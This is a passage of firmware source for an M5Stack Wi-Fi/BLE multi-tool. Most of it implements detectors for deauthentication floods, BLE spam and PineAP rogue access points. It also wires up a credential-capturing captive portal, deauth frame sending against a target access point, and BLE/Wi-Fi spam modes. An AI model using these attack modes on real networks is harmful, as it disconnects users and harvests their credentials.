  DISP.println(TXT_STK_NXT);
  DISP.println(TXT_STK_SEL);
  DISP.println(TXT_STK_HOME);
  delay(3000);
#endif
}

void qrmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(qrcodes) / sizeof(QRCODE) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(qrcodes[i].name);
  }
}

void qrmenu_setup() {
  cursor = 0;
  rstOverride = true;
  qrmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void qrmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(qrcodes) / sizeof(QRCODE) );
    qrmenu_drawmenu();
    activeQR = false;
    delay(250);
  }
  if (check_select_press()) {
    if (qrcodes[cursor].url.length() < 1){
      current_proc = 1;
      isSwitching = true;
    }else if ( activeQR == false ) {
      activeQR = true;
      DISP.fillScreen(WHITE);
      DISP.qrcode(qrcodes[cursor].url, (DISP.width() - DISP.height()) / 2, 0, DISP.height(), 5);
      delay(500);
    } else {
      isSwitching = true;
      activeQR = false;
      delay(250);
    }
  }
}

/// NEMO PORTAL

void portal_setup(){
  setupWiFi();
  setupWebServer();
  portal_active = true;
  cursor = 0;
  rstOverride = true;
  printHomeToScreen();
  #if defined(DEAUTHER)                                                                      // DEAUTH
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));                  // DEAUTH
  wsl_bypasser_send_deauth_frame(&ap_record, channel);                                       // DEAUTH  CREATE FRAME
  #endif                                                                                     // DEAUTH
  delay(500); // Prevent switching after menu loads up
}

void portal_loop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen();
    }
  }
  if (clone_flg==true) {
    #if defined(DEAUTHER)
      if (target_deauth_flg) {
        if (target_deauth == true) {                                                                 // DEAUTH
          if (deauth_tick==35) {                                                                     // 35 is +-100ms   (Add delay to attack, without reflection on portal)
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                 // DEAUTH   SEND FRAME
            deauth_tick=0;
          } else { 
            deauth_tick=deauth_tick+1; 
          }
          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
          DISP.setCursor(1, 115);                                                                    // DEAUTH
          DISP.println(TXT_DEAUTH_STOP);                                                             // DEAUTH
          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
        } else{                                                                                      // DEAUTH
          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
          DISP.setCursor(1, 115);                                                                    // DEAUTH
          DISP.println(TXT_DEAUTH_START);                                                            // DEAUTH
          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
        }                                                                                            // DEAUTH
        if (check_select_press()){                                                                    // DEAUTH
          target_deauth = !target_deauth;                                                             // DEAUTH
          delay(500);                                                                                 // DEAUTH
        }
      }
    #endif
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (check_next_press()){
    shutdownWebServer();
    portal_active = false;
    target_deauth_flg = false;                                                                     // DEAUTH
    target_deauth = false;                                                                         // DEAUTH
    clone_flg = false;                                                                             // DEAUTH
    current_proc = 12;
    delay(500);
  }
  check_select_press();
}

/// ENTRY ///
void setup() {
Serial.begin(115200);
#if defined(CARDPUTER)
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
#else
  M5.begin();
#endif
#if defined(BACKLIGHT)
  pinMode(BACKLIGHT, OUTPUT); // Backlight analogWrite range ~150 - 255
#endif
  if(check_next_press()){
    clearSettings();
  }
  #if defined(USE_EEPROM)
    EEPROM.begin(EEPROM_SIZE);
    Serial.printf("EEPROM  0 - Rotation:   %d\n", EEPROM.read(0));
    Serial.printf("EEPROM  1 - Dim Time:   %d\n", EEPROM.read(1));
    Serial.printf("EEPROM  2 - Brightness: %d\n", EEPROM.read(2));
    Serial.printf("EEPROM  3 - TVBG Reg:   %d\n", EEPROM.read(3));
    Serial.printf("EEPROM  4 - FGColor:    %d\n", EEPROM.read(4));
    Serial.printf("EEPROM  5 - BGColor:    %d\n", EEPROM.read(5));
    Serial.printf("EEPROM  6 - BLE RSSI:   %d\n", EEPROM.read(6));
    Serial.printf("EEPROM  7 - BLE Pkts:   %d\n", EEPROM.read(7));
    Serial.printf("EEPROM  8 - DH RSSI:    %d\n", EEPROM.read(8));
    Serial.printf("EEPROM  9 - DH Pkts:    %d\n", EEPROM.read(9));
    Serial.printf("EEPROM 10 - PH SSIDs:   %d\n", EEPROM.read(9));
    
    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1 || EEPROM.read(4) > 19 || EEPROM.read(5) > 19 || EEPROM.read(6) > 100 || EEPROM.read(8) > 100 || EEPROM.read(9) > 100 || EEPROM.read(10) > 100 ) {
      // Assume out-of-bounds settings are a fresh/corrupt EEPROM and write defaults for everything
      Serial.println("EEPROM likely not properly configured. Writing defaults.");
      #if defined(CARDPUTER)
      EEPROM.write(0, 1);    // Right rotation for cardputer
      #else
      EEPROM.write(0, 3);    // Left rotation
      #endif
      EEPROM.write(1, 15);   // 15 second auto dim time
      EEPROM.write(2, 100);  // 100% brightness
      EEPROM.write(3, 0);    // TVBG NA Region
      EEPROM.write(4, 11);   // FGColor Green
      EEPROM.write(5, 1);    // BGcolor Black
      EEPROM.write(6, 40);   // -40 RSSI Max for BLE Hunter
      EEPROM.write(7, 50);   // > 50 Pkts triggers BLE Hunter Alert 
      EEPROM.write(8, 20);   // -20 RSSI Max for Deauth Hunter
      EEPROM.write(9, 50);   // > 50 Pkts triggers Deauth Hunter Alert
      EEPROM.write(10, 5);   // >= 5 SSIDs per BSSID Triggers PineAP Hunter Alert
      EEPROM.commit();
    }
    rotation = EEPROM.read(0);
    screen_dim_time = EEPROM.read(1);
    brightness = EEPROM.read(2);
    region = EEPROM.read(3);
    setcolor(true, EEPROM.read(4));
    setcolor(false, EEPROM.read(5));
    bh_max_rssi = -(EEPROM.read(6));
    bh_pkts = EEPROM.read(7);
    dh_max_rssi = -(EEPROM.read(8));
    dh_pkts = EEPROM.read(9);
  #endif
  getSSID();
  
  // Pin setup
#if defined(M5LED)
  pinMode(M5LED, OUTPUT);
  digitalWrite(M5LED, M5LED_OFF); //LEDOFF
#endif
#if defined(IRLED)
  pinMode(IRLED, OUTPUT);
  digitalWrite(IRLED, M5LED_OFF); //LEDOFF
#endif
#if !defined(KB)
  pinMode(M5_BUTTON_HOME, INPUT);
  pinMode(M5_BUTTON_RST, INPUT);
#endif
#if defined(M5_BUTTON_MENU)
  pinMode(M5_BUTTON_MENU, INPUT);
#endif
  // Random seed
  randomSeed(analogRead(0));

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Nemo Portal Init
  setupSdCard();
  bootTime = lastActivity = millis();

  screenBrightness(brightness);
  dimtimer();
  DISP.setRotation(rotation);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  bootScreen();
}

// Wrapper functions for menuController.loop() to avoid lambda issues
void menu_controller_loop() {
  menuController.loop();
}

// Process handler structure to replace dual switch statements
struct ProcessHandler {
  int id;
  void (*setup_func)();
  void (*loop_func)();
  const char* name;
};

// Unified process table
ProcessHandler processes[] = {
#if defined(RTC)
  {0, clock_setup, clock_loop, "Clock"},
#endif
  {1, mmenu_setup, menu_controller_loop, "Main Menu"},
  {2, smenu_setup, menu_controller_loop, "Settings Menu"},
#if defined(RTC)
  {3, timeset_setup, timeset_loop, "Time Settings"},
#endif
  {4, dmenu_setup, menu_controller_loop, "Display Menu"},
  {5, tvbgone_setup, tvbgone_loop, "TV-B-Gone"},
#if defined(AXP) || defined(PWRMGMT) || defined(CARDPUTER)
  {6, battery_setup, battery_loop, "Battery Info"},
#endif
#if defined(ROTATION)
  {7, rmenu_setup, menu_controller_loop, "Rotation Menu"},
#endif
  {8, aj_setup, aj_loop, "Apple Juice"},
  {9, aj_adv_setup, aj_adv, "Apple Juice Advanced"},
  {10, credits_setup, credits_loop, "Credits"},
  {11, wifispam_setup, wifispam_loop, "WiFi Spam"},
  {12, wsmenu_setup, wsmenu_loop, "WiFi Scanner Menu"},
  {13, tvbgmenu_setup, menu_controller_loop, "TV-B-Gone Menu"},
  {14, wscan_setup, wscan_loop, "WiFi Scan"},
  {15, wscan_result_setup, wscan_result_loop, "WiFi Scan Results"},
  {16, btmenu_setup, btmenu_loop, "Bluetooth Menu"},
  {17, btmaelstrom_setup, btmaelstrom_loop, "BLE Maelstrom"},
  {18, qrmenu_setup, qrmenu_loop, "QR Menu"},
  {19, portal_setup, portal_loop, "Captive Portal"},
  {20, wsAmenu_setup, wsAmenu_loop, "WiFi Attack Menu"},
#if defined(DEAUTHER)
  {21, deauth_setup, deauth_loop, "Deauth Attack"},
#endif
  {22, color_setup, color_loop, "Color Settings"},
  {23, theme_setup, theme_loop, "Theme Settings"},
  {24, deauth_hunter_setup, deauth_hunter_loop, "Deauth Hunter"},
  {25, ble_hunter_setup, ble_hunter_loop, "BLE Hunter"},
  {26, pineap_hunter_setup, pineap_hunter_loop, "PineAP Hunter"},
  {29, bh_rssi_setup, bh_rssi_loop, "BH RSSI Setting"},
  {30, dh_rssi_setup, dh_rssi_loop, "DH RSSI Setting"}, 
  {31, bh_alert_pkts_setup, bh_alert_pkts_loop, "BH Alert Pkts Setting"},
  {32, dh_alert_pkts_setup, dh_alert_pkts_loop, "DH Alert Pkts Setting"},
  {33, ph_alert_ssids_setup, ph_alert_ssids_loop, TXT_PH_ALERT_SSIDS},
#if defined(SDCARD) && !defined(CARDPUTER)
  {97, nullptr, ToggleSDCard, "SD Card"},
#endif
  {-1, nullptr, nullptr, nullptr} // Sentinel
};

// Run setup for current process
void runCurrentSetup() {
  for (int i = 0; processes[i].id != -1; i++) {
    if (processes[i].id == current_proc) {
      if (processes[i].setup_func) {
        processes[i].setup_func();
      }
      return;
    }
  }
}

// Run loop for current process
void runCurrentLoop() {
  for (int i = 0; processes[i].id != -1; i++) {
    if (processes[i].id == current_proc) {
      if (processes[i].loop_func) {
        processes[i].loop_func();
      }
      return;
    }
  }
}

void loop() {
  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
  screen_dim_proc();
  check_menu_press();
  
  // Switcher - unified process handler
  if (isSwitching) {
    isSwitching = false;
    Serial.printf("Switching To Task: %d\n", current_proc);
    runCurrentSetup();
  }

  // Main process loop - unified handler
  runCurrentLoop();
}

///////////////////////////////
/// DEAUTH HUNTER IMPLEMENTATION ///
///////////////////////////////

// Global variables for Deauth Hunter
DeauthStats deauth_stats;
uint8_t current_channel_idx = 0;
uint32_t last_channel_change = 0;
uint32_t scan_cycle_start = 0;
bool deauth_hunter_active = false;
std::vector<String> seen_ap_macs;
bool channel_hop_pause = false;

uint16_t getRSSIColor(float rssi, float max) {
  if(rssi < max * .5 ) {
    return BLUE;
  } else if(rssi < max * .8 ) {
    return YELLOW;
  } else {
    return RED;
  }
}

// Extract MAC address from packet
void extract_mac(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", 
          data[offset+0], data[offset+1], data[offset+2], 
          data[offset+3], data[offset+4], data[offset+5]);
}

// Add unique AP to tracking list
void add_unique_ap(const char* mac) {
  String mac_str = String(mac);
  for(auto& seen_mac : seen_ap_macs) {
    if(seen_mac == mac_str) return; // Already seen
  }
  seen_ap_macs.push_back(mac_str);
  deauth_stats.unique_aps = seen_ap_macs.size();
}

// Draw RSSI bar visualization
void draw_rssi_bar(float rssi, float rssimax = -20) {
  DISP.print(" ");
  DISP.print(rssi);
  DISP.println("dBm");
  DISP.println("Sel: Pause/Scan\nNext: Exit");
  float rssipct = 100 + rssi;
  float maxpct = 100 + rssimax;

  // Cap values stronger than -20 dBm to prevent bar overflow
  if (rssipct > maxpct) rssipct = maxpct; 
  uint16_t rssiColor=getRSSIColor(rssipct, maxpct);
  int barX = 10, barY = 120, barW = 220, barH = 10;
  DISP.drawRect(barX, barY, barW, barH, rssiColor);
  int fillW = (barW - 4) * (rssipct / maxpct); 
  DISP.fillRect(barX + 2, barY + 2, fillW, barH - 4, rssiColor);
  int remainingW = (barW - 4) - fillW;
  if (remainingW > 0) {
    DISP.fillRect(barX + 2 + fillW, barY + 2, remainingW, barH - 4, TFT_BLACK);
  }
}

// Channel hopping function
void hop_channel() {
  uint32_t now = millis();
  if(now - last_channel_change > 1000) { // Change channel every second
    current_channel_idx = (current_channel_idx + 1) % NUM_CHANNELS;
    esp_wifi_set_channel(WIFI_CHANNELS[current_channel_idx], WIFI_SECOND_CHAN_NONE);
    last_channel_change = now;
  }
}

// Reset statistics if 10 seconds have passed
void reset_stats_if_needed() {
  uint32_t now = millis();
  if(now - deauth_stats.last_reset_time > 1000) { // 1 second cycle
    deauth_stats.total_deauths = 0;  // Reset total counter
    deauth_stats.rssi_sum = 0;
    deauth_stats.rssi_count = 0;
    deauth_stats.avg_rssi = -100;
    seen_ap_macs.clear();
    deauth_stats.unique_aps = 0;
    deauth_stats.last_reset_time = now;
    scan_cycle_start = now;
  }
}

// Deauth packet sniffer callback (adapted from ESP32Marauder)
static void deauth_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(!deauth_hunter_active) return;
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  
  // Debug: Show all management frames received
  if (type == WIFI_PKT_MGMT) {
    uint8_t frame_type = snifferPacket->payload[0];
    
    // Check for deauth (0xC0) or disassoc (0xA0) frames
    if (frame_type == 0xC0 || frame_type == 0xA0) {
      deauth_stats.total_deauths++;
      
      // Extract source MAC (AP sending deauth)
      char source_mac[18];
      extract_mac(source_mac, snifferPacket->payload, 10);
      add_unique_ap(source_mac);
      
      // Track RSSI for averaging (prevent overflow with rolling average)
      float rssi = snifferPacket->rx_ctrl.rssi;
      
      if(deauth_stats.rssi_count == 0) {
        // First measurement
        deauth_stats.avg_rssi = rssi;
        deauth_stats.rssi_count = 1;
        deauth_stats.rssi_sum = rssi;
      } else {
        // Rolling average to prevent overflow
        deauth_stats.rssi_count++;
        deauth_stats.rssi_sum += rssi;
        deauth_stats.avg_rssi = rssi;
        
        // Prevent overflow by resetting sums when count gets high
        if(deauth_stats.rssi_count > 1000) {
          deauth_stats.rssi_sum = deauth_stats.avg_rssi;
          deauth_stats.rssi_count = 1;
        }
      }
    }
    
    // Debug: Periodically show we're getting packets
    static uint32_t packet_count = 0;
    packet_count++;
  }
}

// Start deauth monitoring
void start_deauth_monitoring() {
  // Properly stop any existing WiFi operations
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  
  // Initialize WiFi in promiscuous mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  // Set up promiscuous mode
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer_callback);
  
  // Set initial channel
  esp_wifi_set_channel(WIFI_CHANNELS[current_channel_idx], WIFI_SECOND_CHAN_NONE);
  
  deauth_hunter_active = true;
  scan_cycle_start = millis();
  deauth_stats.last_reset_time = scan_cycle_start;
}

// Stop deauth monitoring  
void stop_deauth_monitoring() {
  esp_wifi_set_promiscuous(false);
  deauth_hunter_active = false;
  WiFi.mode(WIFI_MODE_STA);
}

// Deauth Hunter setup function
void deauth_hunter_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  
  // Initialize stats
  memset(&deauth_stats, 0, sizeof(DeauthStats));
  deauth_stats.avg_rssi = -90;
  seen_ap_macs.clear();
  current_channel_idx = 0;
  channel_hop_pause = false;
  start_deauth_monitoring();
  delay(500);
}

// Deauth Hunter main loop
void deauth_hunter_loop() {
  // Handle button input for exit
  if (check_next_press()) {
    stop_deauth_monitoring();
    isSwitching = true;
    current_proc = 12; // Return to WiFi menu
    return;
  }
  
  if (check_select_press()) {
    channel_hop_pause = !channel_hop_pause;
    delay(500);
  }

  // Channel hopping
  if (!channel_hop_pause){
    hop_channel();
  }
  
  // Reset stats every 10 seconds
  reset_stats_if_needed();
  
  // Update display
  uint32_t now = millis();
  uint32_t cycle_elapsed = (now - scan_cycle_start) / 1000; // seconds elapsed
  uint32_t refresh_countdown = (10 - (cycle_elapsed % 10)); // countdown to reset
  
  //DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.setTextSize(SMALL_TEXT);

  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("Deauth Hunter");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);

  
  // Line 2: Channel & AP Count
  DISP.printf("Ch: ");
  DISP.printf("%-2d", WIFI_CHANNELS[current_channel_idx]);
  DISP.print(" APs: ");
  DISP.printf("%-2d\n", deauth_stats.unique_aps);
  
  // Line 3: Total Deauths
  DISP.printf("Pkts: %-5d / %d\n", deauth_stats.total_deauths, dh_pkts);
  if (dh_pkts && !channel_hop_pause && deauth_stats.total_deauths > dh_pkts){
    play_alert_beep();
  }
  // Line 4: Average RSSI with bar chart
  DISP.print("RSSI:");
  draw_rssi_bar(deauth_stats.avg_rssi, dh_max_rssi);
  
  delay(100); // Refresh rate limiting
}

///////////////////////////////
/// BLE HUNTER IMPLEMENTATION ///
///////////////////////////////

// Global variables for BLE Hunter
BLEStats ble_stats;
BLEScan* ble_scanner = nullptr;
bool ble_hunter_active = false;
bool ble_channel_hop_pause = false;
std::vector<BLEDeviceInfo> seen_ble_devices;

// BLE scan callback implementation
void BLEHunterCallback::onResult(BLEAdvertisedDevice advertisedDevice) {
  if (!ble_hunter_active) return;
  
  // Rate limiting to prevent memory overflow
  static uint32_t last_process = 0;
  uint32_t now = millis();
  if (now - last_process < 50) { // Limit to 20 devices per second
    return;
  }
  last_process = now;
  
  String mac = advertisedDevice.getAddress().toString().c_str();
  String name = advertisedDevice.getName().c_str();
  int32_t rssi = advertisedDevice.getRSSI();
  
  // Update statistics
  ble_stats.total_devices++;
  ble_stats.rssi_sum += rssi;
  ble_stats.rssi_count++;
  ble_stats.avg_rssi = rssi;
  
  // Add unique device
  add_unique_ble_device(mac, name, rssi);
}

// Add unique BLE device to seen list
void add_unique_ble_device(const String& mac, const String& name, int32_t rssi) {
  // Check if device already exists
  for (auto& device : seen_ble_devices) {
    if (device.mac == mac) {
      device.rssi = rssi; // Update RSSI
      device.last_seen = millis();
      return;
    }
  }
  
  // Check if we've hit the device limit
  if (seen_ble_devices.size() >= MAX_BLE_DEVICES) {
    return; // Don't add more devices to prevent memory overflow
  }
  
  // Add new device
  BLEDeviceInfo newDevice;
  newDevice.mac = mac;
  newDevice.name = name.length() > 0 ? name : "Unknown";
  newDevice.rssi = rssi;
  newDevice.last_seen = millis();
  newDevice.device_type = detect_device_type(mac, name);
  
  seen_ble_devices.push_back(newDevice);
  ble_stats.unique_devices = seen_ble_devices.size();
}

// Detect device type based on MAC and name
String detect_device_type(const String& mac, const String& name) {
  // Apple devices
  if (name.indexOf("AirPods") != -1 || name.indexOf("iPhone") != -1 || 
      name.indexOf("iPad") != -1 || name.indexOf("Apple") != -1) {
    return "Apple";
  }
  
  // Android devices
  if (name.indexOf("Android") != -1 || name.indexOf("Galaxy") != -1 || 
      name.indexOf("Pixel") != -1) {
    return "Android";
  }
  
  // Check MAC prefix for known vendors
  String macPrefix = mac.substring(0, 8);
  macPrefix.toUpperCase();
  
  if (macPrefix.startsWith("FC:58:FA") || macPrefix.startsWith("3C:7C:3F")) {
    return "Apple";
  }
  
  return "Unknown";
}

// Start BLE monitoring
void start_ble_monitoring() {
  if (ble_hunter_active) return;
  
  // Initialize BLE
  BLEDevice::init("");
  ble_scanner = BLEDevice::getScan();
  ble_scanner->setAdvertisedDeviceCallbacks(new BLEHunterCallback());
  ble_scanner->setActiveScan(true);
  ble_scanner->setInterval(BLE_SCAN_INTERVAL);
  ble_scanner->setWindow(BLE_SCAN_WINDOW);
  ble_hunter_active = true;
}

// Stop BLE monitoring
void stop_ble_monitoring() {
  if (!ble_hunter_active) return;
  
  if (ble_scanner) {
    ble_scanner->stop();
    ble_scanner->clearResults();
  }
  BLEDevice::deinit();
  
  ble_hunter_active = false;
}

// Reset BLE statistics if needed
void reset_ble_stats_if_needed() {
  uint32_t now = millis();
  if (now - ble_stats.last_reset_time > 10000) { // Reset every 10 seconds
    ble_stats.total_devices = 0;
    ble_stats.rssi_sum = 0;
    ble_stats.rssi_count = 0;
    ble_stats.avg_rssi = -70;
    ble_stats.last_reset_time = now;
    
    // Clean up old devices (older than 15 seconds) or if we have too many
    seen_ble_devices.erase(
      std::remove_if(seen_ble_devices.begin(), seen_ble_devices.end(),
        [now](const BLEDeviceInfo& device) {
          return (now - device.last_seen) > 15000;
        }),
      seen_ble_devices.end()
    );
    
    // If still too many devices, remove oldest ones
    while (seen_ble_devices.size() > MAX_BLE_DEVICES) {
      seen_ble_devices.erase(seen_ble_devices.begin());
    }
    
    ble_stats.unique_devices = seen_ble_devices.size();
  }
}

// BLE Hunter setup
void ble_hunter_setup() {
  // Reset statistics
  ble_stats = BLEStats();
  seen_ble_devices.clear();
  ble_channel_hop_pause = false;
  ble_stats.last_reset_time = millis();
  
  // Setup display
  DISP.setCursor(0, 0);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" BLE Hunter  ");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.println("Initializing...");
  start_ble_monitoring();
}

// BLE Hunter main loop
void ble_hunter_loop() {
  // Handle button input for exit
  if (check_next_press()) {
    stop_ble_monitoring();
    isSwitching = true;
    current_proc = 16; // Return to Bluetooth menu
    return;
  }
  
  if (check_select_press()) {
    ble_channel_hop_pause = !ble_channel_hop_pause;
    delay(500);
  }

  // Periodic BLE scanning (unless paused)
  static uint32_t last_scan = 0;
  uint32_t now = millis();
  
  if (ble_scanner && (now - last_scan > 1000)) {
    ble_scanner->start(BLE_SCAN_TIME, false); // Scan for BLE_SCAN_TIME seconds, don't restart
    last_scan = now;
  }
  
  // Reset stats every 10 seconds
  reset_ble_stats_if_needed();
  
  // Update display
  delay(100); // Refresh rate limiting
  uint32_t cycle_elapsed = (now - ble_stats.last_reset_time) / 1000;
  uint32_t refresh_countdown = (10 - (cycle_elapsed % 10));
  
  DISP.setCursor(0, 0);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" BLE Hunter  ");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  
  // Line 2: Status and Device Count
  DISP.printf("Devices: %-6d\n", ble_stats.unique_devices);
  
  // Line 3: Total packets seen
  DISP.printf("Pkts: %-5d / %3d\n", ble_stats.total_devices, bh_pkts);
    if (bh_pkts && !ble_channel_hop_pause && ble_stats.total_devices > bh_pkts){
      play_alert_beep();
    }
  
  // Line 4: Average RSSI with bar chart
  if (ble_stats.rssi_count > 0) {
    DISP.print("RSSI:");
    draw_rssi_bar(ble_stats.avg_rssi, bh_max_rssi); // Using existing RSSI bar function
  }
  
}

// BLE Hunter cleanup
void ble_hunter_cleanup() {
  stop_ble_monitoring();
  seen_ble_devices.clear();
}

///////////////////////////////
/// PINEAP HUNTER IMPLEMENTATION ///
///////////////////////////////

// Global variables
PineAPHunterStats pineap_hunter_stats;
bool pineap_hunter_active = false;
uint32_t last_beep_time = 0;

void pineap_hunter_setup() {
  pineap_hunter_active = true;
  pineap_hunter_stats = PineAPHunterStats();
  pineap_hunter_stats.scan_cycle_start = millis();
  pineap_hunter_stats.view_mode = 0;
  cursor = 0; // Use global cursor instead of local cursor variables

  DISP.fillScreen(BGCOLOR);
  DISP.setTextColor(BGCOLOR, FGCOLOR);  // Inverse colors for header
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_PINEAP_HUNTER);
  DISP.setTextColor(FGCOLOR, BGCOLOR);  // Normal colors
  DISP.setTextSize(SMALL_TEXT);

  rstOverride = true;
  delay(500);
}

void pineap_hunter_loop() {
  // Handle input based on current view mode
  switch (pineap_hunter_stats.view_mode) {
    case 0: handle_main_list_input(); break;
    case 1: handle_bssid_details_input(); break;
    case 2: handle_ssid_list_input(); break;
  }

  // Continuous scanning and analysis
  if (pineap_hunter_active) {
    scan_and_analyze();
    update_pineapple_list();

    // Update display more frequently to show current RSSI values
    static uint32_t last_display_update = 0;
    if (pineap_hunter_stats.list_changed || (millis() - last_display_update > 1000)) {
      update_display();
      last_display_update = millis();
      pineap_hunter_stats.list_changed = false;
    }
  }
}

void handle_main_list_input() {
  // Beep alert if pineaps detected
  if (!pineap_hunter_stats.detected_pineaps.empty() &&
    (millis() - last_beep_time > 5000)) { // Beep every 5 seconds max
    play_alert_beep();
    last_beep_time = millis();
  }

  if (check_next_press()) {
    // Always allow cursor navigation - total items = detected pineaps + 1 ("Back")
    int total_items = pineap_hunter_stats.detected_pineaps.size() + 1;
    cursor++;

    // Handle negative cursor values by jumping to end of list
    if (cursor < 0) {
      cursor = total_items - 1;
    } else {
      cursor %= total_items;
    }
    update_display();
    delay(250);
  }

  if (check_select_press()) {
    if (cursor >= pineap_hunter_stats.detected_pineaps.size()) {
      // "Back" selected - return to WiFi menu
      pineap_hunter_cleanup();
      isSwitching = true;
      current_proc = 12; // WiFi menu
    } else if (!pineap_hunter_stats.detected_pineaps.empty()) {
      // BSSID selected - show SSID list
      pineap_hunter_stats.selected_bssid_index = cursor; // Store which BSSID was selected
      pineap_hunter_stats.view_mode = 2; // Jump directly to SSID list
      cursor = 0; // Reset cursor for SSID list navigation
      update_display();
    }
    delay(250);
  }
}

void handle_bssid_details_input() {
  // Future enhancement - for now unused
  if (check_next_press() || check_select_press()) {
    pineap_hunter_stats.view_mode = 2; // Go to SSID list
    cursor = 0; // Reset cursor for SSID list
    update_display();
    delay(250);
  }
}

void handle_ssid_list_input() {
  if (check_next_press()) {
    if (pineap_hunter_stats.selected_bssid_index < pineap_hunter_stats.detected_pineaps.size()) {
      const auto& pine = pineap_hunter_stats.detected_pineaps[pineap_hunter_stats.selected_bssid_index];
      int total_items = pine.essids.size() + 1; // +1 for "Back"
      cursor++;

      // Handle negative cursor values by jumping to end of list
      if (cursor < 0) {
        cursor = total_items - 1;
      } else {
        cursor %= total_items;
      }
    }
    update_display();
    delay(250);
  }

  if (check_select_press()) {
    // Always return to main list (whether Back is selected or an SSID is selected)
    pineap_hunter_stats.view_mode = 0;
    cursor = pineap_hunter_stats.selected_bssid_index; // Restore cursor to selected BSSID
    update_display();
    delay(250);
  }
}

void scan_and_analyze() {
  static uint32_t last_wifi_scan = 0;

  // Scan every 2 seconds for faster Pineapple detection
  if (millis() - last_wifi_scan > 2000) {
    // Use passive scan with longer dwell time to better catch Pineapple SSID rotation
    //int n = WiFi.scanNetworks(false, false, true, 1000); // passive=true, 1000ms per channel
    int n = WiFi.scanNetworks(); // passive=true, 1000ms per channel
    if (n > 0) {
      Serial.printf("\n=== WiFi Scan Results: %d networks found ===\n", n);
      for (int i = 0; i < n; i++) {
        String bssid_str = WiFi.BSSIDstr(i);
        String essid = WiFi.SSID(i);
        int32_t rssi = WiFi.RSSI(i);

        Serial.printf("[%d] BSSID: %s, SSID: '%s', RSSI: %d dBm\n",
                      i, bssid_str.c_str(), essid.c_str(), rssi);

        // Only process networks with valid ESSIDs
        if (essid.length() > 0 && bssid_str.length() > 0) {
          add_scan_result(bssid_str, essid, rssi);
        }
      }

      pineap_hunter_stats.total_scans++;
      process_scan_results();
      maintain_buffer_size();

      // Debug: Show scan buffer state
      Serial.printf("\n=== Scan Buffer State ===\n");
      Serial.printf("Total BSSIDs in buffer: %d\n", pineap_hunter_stats.scan_buffer.size());
      for (const auto& entry : pineap_hunter_stats.scan_buffer) {
        const String& bssid = entry.first;
        const std::vector<SSIDRecord>& ssids = entry.second;
        Serial.printf("BSSID %s: %d SSIDs\n", bssid.c_str(), ssids.size());
        for (size_t i = 0; i < ssids.size(); i++) {
          Serial.printf("  [%d] '%s' (RSSI: %d, last_seen: %u)\n",
                        i, ssids[i].essid.c_str(), ssids[i].rssi, ssids[i].last_seen);
        }
      }

      Serial.printf("\n=== Detected PineAPs: %d ===\n", pineap_hunter_stats.detected_pineaps.size());
      for (size_t i = 0; i < pineap_hunter_stats.detected_pineaps.size(); i++) {
        const auto& pine = pineap_hunter_stats.detected_pineaps[i];
        String bssid_str = bssid_to_string(pine.bssid);
        Serial.printf("PineAP %d: %s (%d SSIDs)\n", i, bssid_str.c_str(), pine.essids.size());
      }
    }

    WiFi.scanDelete(); // Free memory
    last_wifi_scan = millis();
  }
}

void add_scan_result(const String& bssid_str, const String& essid, int32_t rssi) {
  // Add to scan buffer
